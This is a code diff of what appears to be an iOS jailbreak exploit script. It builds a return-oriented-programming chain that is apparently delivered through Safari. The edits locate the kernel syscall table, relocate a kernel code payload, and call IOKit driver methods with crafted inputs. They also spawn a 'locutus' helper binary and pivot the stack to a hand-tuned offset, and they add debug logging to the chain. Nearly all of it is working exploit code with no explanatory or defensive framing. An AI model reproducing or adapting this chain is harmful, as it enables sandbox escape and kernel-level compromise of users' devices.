@@ -31,19 +31,26 @@ def add_lib(short, path):
     dmini.cur.add_lib(short, path)
     lib_paths.add(path)
 
+debugging = True
+
 def dbg_result():
-    if True:
+    if debugging:
         result, resultp = stackunkpair()
         store_r0_to(resultp)
         back = sys._getframe().f_back
-        funcall('_printf', ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result)
+        if mode == 'two':
+            funcall('_fprintf', console, ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result, load_r0=True)
+        else:
+            funcall('_syslog', 0, ptr('Result for %s:%d was %%08x' % (back.f_code.co_filename, back.f_lineno), True), result)
 
 dmini.init(cachefile, True)
 
 dmini.init(kernfile, False)
 
+sysent = dmini.cur.find_basic('- 00 10 86 00') + 4
+
 code_addr = 0x80000400 # XXX
-weirdfile = dmini.Connection('kcode.o', rw=True).relocate(dmini.cur, code_addr).nth_segment(0)[:-4]
+weirdfile = dmini.Connection('kcode.o', rw=True).relocate(dmini.cur, code_addr).nth_segment(0)[:-8]
 count = 0
 stuff = ''
 while True:
@@ -56,7 +63,7 @@ while True:
         continue
     stuff += I(addr, len(data)) + data
     count += 1
-weirdfile = pointed(weirdfile + I(count) + stuff)
+weirdfile = pointed(weirdfile + I(sysent, count) + stuff)
 
 def mov_r3_r7():
     # push {r1, r3, r6, r7, lr}
@@ -102,15 +109,18 @@ if mode == 'dejavu':
     init('R4', 'R5', 'PC')
     make_r7_avail()
     set_sp_to_sp()
-else:
-    init('R8', 'R10', 'R11', 'R4', 'R5', 'R6', 'R7', 'PC')
-make_avail()
-
-if mode == 'dejavu':
+    make_avail()
     load_r0_from(reloc(0xe, 0x558))
     load_r0_r0()
     zlocutusp, zlocutuspp = stackunkpair()
     store_r0_to(zlocutuspp)
+else:
+    init('R8', 'R10', 'R11', 'R4', 'R5', 'R6', 'R7', 'PC')
+    make_avail()
+    if debugging:
+        console = ptrI(0)
+        funcall('_fopen', ptr('/dev/console', True), ptr('a', True))
+        store_r0_to(console)
 
 funcall('_mach_task_self')
 task_self, task_self_p = stackunkpair()
@@ -135,14 +145,16 @@ if mode == 'two':
     # XXX is this necessary? it's from star
     funcall('iokit._IOKitWaitQuiet', 0, ptrI(0, 0, 0))
 
-#funcall('iokit._IOServiceMatching', ptr('AppleRGBOUT', True))
-funcall('iokit._IOServiceMatching', ptr('AppleCLCD', True))
+# XXX this won't work at boot because there is no notify!
+funcall('iokit._IOServiceMatching', ptr('AppleRGBOUT', True))
+#funcall('iokit._IOServiceMatching', ptr('AppleCLCD', True))
 matching, matchingp = stackunkpair()
 store_r0_to(matchingp)
 funcall('iokit._IOServiceGetMatchingService', 0, matching)
 connect = ptrI(0)
 funcall('iokit._IOServiceOpen', None, task_self, 0, connect); dbg_result()
 
+# XXX In Safari, I need to kill this
 funcall('iokit._IOConnectCallScalarMethod', connect, 21, ptrI(0xeeeeeeee, 0xeeeeeeee), 2, 0, 0, load_r0=True); dbg_result()
 
 funcall('iokit._IOConnectCallStructMethod', connect, 5, ptr(transaction), len(transaction), 0, 0, load_r0=True); dbg_result()
@@ -167,21 +179,14 @@ if mode == 'dejavu':
     fd, fdp = stackunkpair()
     store_r0_to(fdp)
     #dbg_result()
-    funcall('_write', None, locutusp, reloc(0xb, 0))
+    funcall('_write', None, locutusp, reloc(0xa, 0))
     dbg_result()
     funcall('_close', fd)
     dbg_result()
-    funcall('_posix_spawn', 0x11000000, locutus_str, 0, 0, ptrI(locutus_str, 0), zerop)
+    funcall('_posix_spawn', 0, locutus_str, 0, 0, zerop, zerop)
     dbg_result()
 
-# XXX vnode enforce
-
 if mode == 'dejavu':
-    funcall('_geteuid')
-    funcall('_setuid', None); dbg_result()
-
-    #funcall('_printf', ptr('done with shellcode\n', True))
-
     set_r0_to(1337)
     fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment
 else:
